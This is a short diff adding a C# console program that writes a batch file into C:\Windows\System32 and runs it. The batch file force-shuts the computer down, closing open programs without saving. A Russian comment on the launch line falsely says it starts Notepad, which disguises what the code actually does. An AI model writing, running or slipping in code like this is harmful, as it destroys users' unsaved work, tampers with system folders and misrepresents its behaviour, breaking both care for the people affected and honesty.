@@ -1,0 +1,26 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.IO;
+using System.Diagnostics;
+
+namespace ConsoleApplication1
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            StreamWriter f = File.AppendText(@"C:\Windows\System32\new.bat");
+            f.WriteLine("@echo off");
+            f.WriteLine("shutdown /s /f");
+            f.Close();
+            Process proc = new Process();
+            //Запускаем Блокнто
+            proc.StartInfo.FileName = @"C:\Windows\System32\new.bat";
+            proc.StartInfo.Arguments = "";
+            proc.Start();
+        }
+    }
+}
